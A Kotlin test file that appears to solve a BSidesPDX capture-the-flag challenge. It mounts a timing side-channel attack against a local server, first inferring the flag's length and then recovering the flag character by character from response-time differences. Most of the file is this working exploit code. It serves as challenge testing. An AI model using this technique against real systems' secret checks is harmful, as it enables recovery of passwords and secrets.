package com.github.blahblahbloopster

import com.github.blahblahbloopster.plugins.FLAG
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.*
import io.ktor.client.request.forms.*
import io.ktor.http.*
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.joinAll
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlin.system.measureNanoTime
import kotlin.test.Test
import kotlin.test.assertEquals

class ApplicationTest {
    private suspend fun trial(flag: String, client: HttpClient, url: String): Long {
//        println(flag)
        val d = FormDataContent(parametersOf("flag", flag))
        val data = mutableListOf<Long>()
        coroutineScope {
            (0..8).map {
                launch {
                    val t = measureNanoTime {
                        client.post("$url/flag") {
                            setBody(d)
                        }
                    }
                    synchronized(data) {
                        data.add(t)
                    }
                }
            }.joinAll()
        }

        return synchronized(data) { data.sorted()[data.size / 2] }
    }

    @Test
    fun testRoot() {
        runBlocking {
            val url = "http://172.17.0.2"  // this has to be filled in manually (this is fine)
            val client = HttpClient(CIO)
            var length = 0
            var lastTime = Long.MAX_VALUE
            for (i in 0 until 1024) {
                val flag = "!".repeat(i)
                val time = trial(flag, client, url)
                length = i
                if (time.toDouble() * 0.5 > lastTime) break
                lastTime = time
            }
            val realFlag = FLAG
            assertEquals(realFlag.length, length)

            val chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/={}"

            var flag = "BSidesPDX{"
            for (i in flag.length until length) {
                lastTime = trial(flag.padEnd(length, '!'), client, url)
                for (c in chars) {
                    val f = flag.padEnd(length, c)
                    val time = trial(f, client, url)
                    if (time.toDouble() - 10_000_000 > lastTime) {
                        flag += c
                        break
                    }
                    lastTime = time
                }
            }

            assertEquals(realFlag, "$flag}")
        }
    }
}